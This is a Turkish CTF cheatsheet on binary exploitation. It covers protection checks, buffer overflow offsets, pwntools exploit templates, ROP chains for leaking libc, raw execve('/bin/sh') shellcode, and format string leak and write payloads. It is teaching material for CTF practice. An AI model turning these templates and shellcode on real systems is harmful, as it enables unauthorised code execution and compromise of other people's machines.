# 💥 Pwn ve İkili İstismar CTF Kopya Kağıdı (Pwn/Binary Exploitation CTF Cheatsheet)

---

## 🔍 İlk Analiz

```bash
# Güvenlik korumalarını kontrol etme
checksec binary

# Dosya bilgisi
file binary
ldd binary        # Bağlı paylaşımlı kütüphaneler

# İkiliyi çalıştırma ve sistem çağrılarını izleme
./binary
ltrace ./binary   # Kütüphane çağrıları
strace ./binary   # Sistem çağrıları
```

---

## 🛡️ İkili Koruma Mekanizmaları

| Koruma | Açıklama | Atlatma Yöntemi |
|--------|----------|-----------------|
| **NX (No-Execute)** | Yığın (stack) üzerinde kod çalıştırmayı engeller | ROP (Return-Oriented Programming) |
| **ASLR** | Bellek adreslerini rastgele dağıtır | Bellek adresi sızdırma (leak) ve ofset hesaplama |
| **PIE** | İkili dosyanın temel adresini rastgele belirler | İkili taban adresini sızdırma |
| **Canary** | Yığın taşmalarını yakalayan kontrol değeri | Kanarya (canary) değerini sızdırma veya atlatma |
| **RELRO** | GOT (Global Offset Table) tablosunu korur | ret2libc veya diğer teknikleri kullanma |

---

## 📏 Tampon Bellek Taşması (Buffer Overflow)

### Ofset Değerini Bulma
```bash
# pwntools kullanarak
cyclic 200        # Desen oluşturma
cyclic -l 0x6161616a  # Ofseti hesaplama

# GDB (GEF/PEDA) kullanarak
pattern create 200
pattern offset 0x6161616a
```

### Temel İstismar Kodu (pwntools)
```python
from pwn import *

p = process('./binary')
# p = remote('host', port)

offset = 64
payload = b'A' * offset
payload += p64(0xdeadbeef)  # Dönüş adresi (Return address)

p.sendline(payload)
p.interactive()
```

---

## 🔗 ROP (Return Oriented Programming)

### Gadget Bulma
```bash
ROPgadget --binary binary
ropper -f binary

# Yaygın ROP Gadget'ları
pop rdi; ret
pop rsi; pop r15; ret
ret                  # Yığın hizalama için
```

### ROP Zinciri Oluşturma (pwntools)
```python
from pwn import *

elf = ELF('./binary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)

# ROP zincirini kurma
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])

payload = b'A' * offset + rop.chain()
```

---

## 🐚 Kabuk Kodu (Shellcode)

### 64-bit Linux Shellcode
```python
# pwntools shellcraft ile otomatik üretim
shellcode = asm(shellcraft.sh())

# Manuel execve("/bin/sh", NULL, NULL)
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
```

---

## 📚 Format Dizesi (Format String) Zafiyeti

```bash
# Bellek sızdırma
%p %p %p %p %p
%x %x %x %x %x

# Belleğe yazma
%n - yazdırılan bayt sayısını yazar
%hhn - tek bayt yazar
```

```python
# pwntools fmtstr ile otomatik yük oluşturma
from pwn import *
fmtstr_payload(offset, {hedef_adres: yazilacak_deger})
```

---

## 🛠️ Temel Araçlar

| Araç | Kullanım Amacı |
|------|----------------|
| **pwntools** | Python tabanlı CTF ve sömürü kütüphanesi |
| **GDB + GEF** | Gelişmiş hata ayıklayıcı arayüzü |
| **ROPgadget / ropper** | İkili dosya içinde ROP parçacıkları arama |
| **one_gadget** | libc içinde tek atımlık execve('/bin/sh') gadget'ı bulma |
| **checksec** | İkili dosyanın derleme korumalarını listeleme |

---

## 📋 Pwn Kontrol Listesi

```markdown
□ checksec ile ikili korumalarını denetleyin
□ Zafiyet türünü belirleyin (yığın taşması, format string vb.)
□ Ofset mesafesini hesaplayın
□ Korumalara uygun strateji seçin (Shellcode mu, ROP mu?)
□ Yerel sistemde istismarı test edin
□ Uzak sunucuya (remote) bağlayarak bayrağı alın
```

---

**CTF'e Dön:** [🏁 CTF Genel Bakış](./README.tr.md)
